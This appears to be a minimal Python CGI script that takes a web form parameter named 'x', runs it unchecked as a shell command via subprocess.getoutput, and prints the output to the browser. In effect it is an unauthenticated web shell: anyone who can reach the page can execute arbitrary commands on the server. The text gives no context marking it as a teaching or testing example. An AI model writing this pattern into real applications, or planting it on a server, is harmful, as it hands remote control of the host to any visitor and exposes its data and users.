#!/usr/bin/python3

print("content-type : text/html")
print()

import cgi
import subprocess as sp

form = cgi.FieldStorage()
cmd = form.getvalue("x")
out = sp.getoutput(cmd)
print(out)

